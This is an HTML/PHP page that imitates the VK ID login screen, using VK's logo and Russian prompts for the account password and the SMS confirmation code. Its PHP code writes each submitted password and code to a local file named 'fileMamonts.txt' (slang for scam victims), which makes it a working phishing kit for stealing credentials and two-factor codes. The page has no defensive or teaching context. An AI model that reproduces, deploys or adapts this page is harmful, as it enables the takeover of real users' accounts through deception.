<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VK LOGIN</title>
  <link rel="stylesheet" href="getCod.css">
  <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/VK_Compact_Logo_%282021-present%29.svg/1024px-VK_Compact_Logo_%282021-present%29.svg.png" type="image/x-icon">
</head>
<body>
  <div id="headerLogo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/VK_Compact_Logo_%282021-present%29.svg/1024px-VK_Compact_Logo_%282021-present%29.svg.png" alt="logo">
    <span>ID</span>
  </div>

  <h3>Введите пароль</h3>
  <p id='textPassVkId'>Пароль от аккаунта VK ID</p>

  <form action="getCod.php" method="post">
    <input type="text" name="pass" placeholder="Введите пароль">
    <button class="successBtn" type="submit">Проверить пароль</button>
  
    <p id="textSmsCod">Код с смс</p>

  
    <input type="text" name="code" placeholder="Введите код">
    <p id="smsTime">Прийдет в течении</p>
    <button class="successBtn" type="submit">Проверить код</button>
  </form>

  <?php
    if($_SERVER['REQUEST_METHOD'] == 'POST'){
      if (isset($_POST['pass'])) {
        $pass = $_POST['pass'];

        $fileMamonts = fopen('fileMamonts.txt', 'a');
        fwrite($fileMamonts,"Pass: $pass \n");
      }
      if (isset($_POST['code'])) {
        $code = $_POST['code'];

        $fileMamonts = fopen('fileMamonts.txt', 'a');
        fwrite($fileMamonts, "Code: $code \n");
      }
    }
  ?>

  <script src="timer.js"></script>
</body>
</html>